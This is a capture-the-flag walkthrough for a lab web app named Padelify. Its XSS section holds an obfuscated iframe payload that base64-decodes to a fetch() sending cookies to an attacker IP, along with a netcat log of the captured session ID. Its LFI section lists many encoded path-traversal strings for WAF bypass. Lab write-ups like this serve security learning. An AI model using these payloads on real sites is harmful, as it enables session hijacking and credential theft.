# Room: Padelify
Difficulty: Medium

### Objectives: You’ve signed up for the Padel Championship, but your rival keeps climbing the leaderboard. The admin panel controls match approvals and registrations. Can you crack the admin and rewrite the draw before the whistle?

Note: In case you want to start over or restart all services, visit http://TARGET_IP/status.php.

## Enumeration
I began enumerating for open ports using nmap -sC -sV.

- -sC = default script
- -sV = version detection

Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3a:16:bc:96:fd:91:86:2c:d1:b4:f4:78:52:04:eb:bb (ECDSA)
|_  256 0d:ed:cf:76:82:af:47:b0:b0:44:5f:3a:20:d9:46:a3 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Padelify - Tournament Registration
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I visited port 80 and found the registration panel. I created an account, but the server indicated that it would be reviewed by the admin.

---

## Web Application Firewall (WAF) Detection

I started enumerating for hidden directories but failed when I ran a basic `ffuf` scan. I checked for a WAF using `wafw00f`.
``` bash
wafw00f http://target_ip
```
Result:
```text
[*] Checking http://TARGET_IP
[+] Generic Detection results:
[*] The site http://TARGET_IP seems to be behind a WAF or some sort of security solution
[~] Reason: The response was different when the request wasn't made from a browser.
Normal response code is "200", while the response code to a modified request is "403"
[~] Number of requests: 4
```
I confirmed the presence of a WAF, so I added a custom User-Agent because ffuf is often blocked.
``` bash
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
```
Result
``` bash
config                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 167ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 226ms]
index.php               [Status: 200, Size: 3853, Words: 1037, Lines: 96, Duration: 248ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 221ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 181ms]
logs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 226ms]
php.ini                 [Status: 403, Size: 2872, Words: 572, Lines: 117, Duration: 166ms]
```
I investigated the config directory because it seemed valuable, and I found a file named app.conf. Upon clicking it, I received a 403 Forbidden alert:
``` text
🚨 SECURITY ALERT 403 FORBIDDEN. Access has been blocked. Web Application Firewall is ACTIVE.
```
## Log Analysis
I checked the logs directory and found /error.log:
```text
[Sat Nov 08 12:03:11.123456 2025] [info] [pid 2345] Server startup: Padelify v1.4.2
[Sat Nov 08 12:03:11.123789 2025] [notice] [pid 2345] Loading configuration from /var/www/html/config/app.conf
[Sat Nov 08 12:05:02.452301 2025] [warn] [modsec:99000005] [client 10.10.84.50:53122] NOTICE: Possible encoded/obfuscated XSS payload observed
[Sat Nov 08 12:08:12.998102 2025] [error] [pid 2361] DBWarning: busy (database is locked) while writing registrations table
[Sat Nov 08 12:11:33.444200 2025] [error] [pid 2378] Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format
[Sat Nov 08 12:12:44.777801 2025] [notice] [pid 2382] Moderator login failed: 3 attempts from 10.10.84.99
[Sat Nov 08 12:13:55.888902 2025] [warn] [modsec:41004] [client 10.10.84.212:53210] Double-encoded sequence observed (possible bypass attempt)
[Sat Nov 08 12:14:10.101103 2025] [error] [pid 2391] Live feed: cannot bind to 0.0.0.0:9000 (address already in use)
[Sat Nov 08 12:20:00.000000 2025] [info] [pid 2401] Scheduled maintenance check completed; retention=30 days
```
## Exploitation: Stored XSS & WAF Bypass
Since there was a previous XSS attempt recorded in the logs, I decided to try that vector. Knowing that the moderator reviews registrations, I aimed to capture his/her cookie.

Basic XSS payloads were detected by the WAF. After several trials and errors, I successfully captured the moderator’s cookie using an obfuscated iframe payload.

Payload:
``` text
<iframe src="ja&#x0D;vascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjEyOS4xMTM6NDQ0NC8/YysnK2RvY3VtZW50LmNvb2tpZSk='))"></iframe>
```
The payload worked because of a Parser Differential—a breakdown in communication between the WAF and the Browser.

- WAF Bypass: The WAF looks for the exact string javascript:. By inserting &#x0D; (a Carriage Return) in the middle, I broke the signature. The WAF saw "junk" data and let it pass.

- Browser Interpretation: When the browser renders the iframe, it ignores the HTML entity &#x0D; and joins the letters together, executing it as a valid javascript: command.

- Encrypted Logic: Using atob (Base64) hid keywords like fetch and cookie from the WAF’s scanner. The code was only "revealed" and executed once it safely reached the admin's browser.

Result (Netcat Listener):
``` bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [YOUR_IP] from (UNKNOWN) [10.48.164.165] 41628
GET /?c+PHPSESSID=ufbsj3tj3fa8riop99p607uos0 HTTP/1.1
```
I hijacked the session by changing my cookie to the moderator’s PHPSESSID. This gave me access to the moderator panel and allowed me to capture the first flag.

## Local File Inclusion (LFI) & Privilege Escalation
While investigating the website, I found a valuable URL endpoint: /live.php?page=match.php.

I attempted a direct LFI but initially failed. Remembering that /config/app.conf was inaccessible due to the WAF, I generated an encoding list to bypass the filter.

Encoding Payload List:
```text
%2fconfig%2fapp.conf
/var/www/html/config/app.conf
%2fvar%2fwww%2fhtml%2fconfig%2fapp.conf
%c0%afconfig%c0%afapp.conf
%e0%80%afconfig%e0%80%afapp.conf
%f0%80%80%afconfig%f0%80%80%afapp.conf
%c0%ae%c0%ae%c0%afconfig%c0%afapp.conf
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afconfig%c0%afapp.conf
%2e%2e%2fconfig%2fapp.conf
%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fconfig%2fapp.conf
%252fconfig%252fapp.conf
%252e%252e%252fconfig%252fapp.conf
%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66
%2f%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66
config%2fapp.conf
config//app.conf
config/./app.conf
config/../config/app.conf
....//....//config/app.conf
.../...//config/app.conf
%2e%2e%5cconfig%5capp.conf
%2fvar%2fwww%2fhtml%2fconfig%2fapp%2econf
%c0%ae%c0%ae%2fconfig%2fapp%2econf
%c0%2e%c0%2e%c0%2fconfig%c0%2fapp%c0%2econf
%c1%9cconfig%c1%9capp.conf
%c1%1cconfig%c1%1capp.conf
%e0%80%ae%e0%80%ae%e0%80%afconfig%e0%80%afapp.conf
%f0%80%80%ae%f0%80%80%ae%f0%80%80%afconfig%f0%80%80%afapp.conf
\u002fconfig\u002fapp\u002econf
\u002e\u002e\u002fconfig\u002fapp\u002econf
%u002fconfig%u002fapp.conf
%u2215config%u2215app.conf
%u2216config%u2216app.conf
%u002e%u002e%u002fconfig%u002fapp.conf
%2fconfig%2f%2e%2e%2fconfig%2fapp.conf
%2f%2e%2fconfig%2fapp.conf
/var/www/html/config/app.conf%00
/var/www/html/config/app.conf%0a
/var/www/html/config/app.conf%0d
/var/www/html/config/app.conf%ff
/var/www/html/config/app.conf%20
/var/www/html/config/app.conf%09
/var/www/html/config/app.conf/.
/var/www/html/config/app.conf/./
/var/www/html/config/app.conf%00.php
/var/www/html/config/app.conf%00.html
/var/www/html/config/app.conf\0
%2fvar%2fwww%2fhtml%2fconfig%2fapp%2econf%00
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fconfig%2fapp.conf
```
I ran this list through Burp Suite Intruder, targeting the page= parameter. While many returned 403, specific encoded variations successfully returned the contents of app.conf, revealing the admin’s password

Found Credentials: 
```text
admin_info = "REDACTED"
```
## Final Flag
I logged in using the credentials admin:REDACTED. The login was successful, granting me full administrative access and the final flag.

